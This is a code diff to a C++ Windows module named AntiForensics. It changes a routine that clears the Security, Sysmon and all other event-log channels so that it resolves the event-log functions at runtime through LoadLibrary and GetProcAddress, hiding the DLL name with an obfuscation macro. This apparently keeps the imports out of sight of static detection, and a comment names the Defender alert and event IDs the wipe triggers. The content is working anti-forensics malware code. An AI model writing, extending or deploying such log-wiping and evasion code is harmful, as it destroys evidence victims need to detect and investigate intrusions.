@@ -1,8 +1,28 @@
 #include "AntiForensics.h"
 #include <winevt.h>
 #include <wbemidl.h>
-#pragma comment(lib, "wevtapi.lib")
-#pragma comment(lib, "wbemuuid.lib")
+#include "Obf.h"
+
+typedef BOOL      (WINAPI *fpEvtClearLog)       (EVT_HANDLE, LPCWSTR, LPCWSTR, DWORD);
+typedef EVT_HANDLE(WINAPI *fpEvtOpenChannelEnum)(EVT_HANDLE, DWORD);
+typedef BOOL      (WINAPI *fpEvtNextChannelPath)(EVT_HANDLE, DWORD, LPWSTR, PDWORD);
+typedef BOOL      (WINAPI *fpEvtClose)          (EVT_HANDLE);
+
+static fpEvtClearLog       pEvtClearLog       = nullptr;
+static fpEvtOpenChannelEnum pEvtOpenChannelEnum = nullptr;
+static fpEvtNextChannelPath pEvtNextChannelPath = nullptr;
+static fpEvtClose          pEvtClose          = nullptr;
+
+static void InitWevtapi() {
+    if (pEvtClearLog) return;
+    std::string dll = S("wevtapi.dll");
+    HMODULE h = LoadLibraryA(dll.c_str());
+    if (!h) return;
+    pEvtClearLog        = (fpEvtClearLog)       GetProcAddress(h, "EvtClearLog");
+    pEvtOpenChannelEnum = (fpEvtOpenChannelEnum) GetProcAddress(h, "EvtOpenChannelEnum");
+    pEvtNextChannelPath = (fpEvtNextChannelPath) GetProcAddress(h, "EvtNextChannelPath");
+    pEvtClose           = (fpEvtClose)           GetProcAddress(h, "EvtClose");
+}
 
 // ── Event log wipe ─────────────────────────────────────────────────────────────
 
@@ -21,6 +41,9 @@ static const wchar_t* kPriorityChannels[] = {
 };
 
 std::string AntiForensics::ClearEventLogs() {
+    InitWevtapi();
+    if (!pEvtClearLog) return "wevtapi init failed";
+
     std::string result;
     int cleared = 0, failed = 0;
 
@@ -28,7 +51,7 @@ std::string AntiForensics::ClearEventLogs() {
     for (auto ch : kPriorityChannels) {
         // Detection: EvtClearLog on Security/Sysmon channels from a non-system process
         // triggers an immediate Windows Defender alert and appears as EventID 1102 / 104.
-        BOOL hLog = EvtClearLog(NULL, ch, NULL, 0);
+        BOOL hLog = pEvtClearLog(NULL, ch, NULL, 0);
         if (hLog) {
             ++cleared;
             // Convert to narrow for result string
@@ -42,19 +65,19 @@ std::string AntiForensics::ClearEventLogs() {
     }
 
     // Phase 2: enumerate all remaining channels via the channel enum API
-    EVT_HANDLE hEnum = EvtOpenChannelEnum(NULL, 0);
+    EVT_HANDLE hEnum = pEvtOpenChannelEnum(NULL, 0);
     if (hEnum) {
         wchar_t chBuf[512] = {};
         DWORD chLen = 0;
-        while (EvtNextChannelPath(hEnum, 512, chBuf, &chLen)) {
-            BOOL hLog = EvtClearLog(NULL, chBuf, NULL, 0);
+        while (pEvtNextChannelPath(hEnum, 512, chBuf, &chLen)) {
+            BOOL hLog = pEvtClearLog(NULL, chBuf, NULL, 0);
             if (hLog) {
                 ++cleared;
             } else {
                 ++failed;
             }
         }
-        EvtClose(hEnum);
+        pEvtClose(hEnum);
     }
 
     result += "\nCleared: " + std::to_string(cleared) +
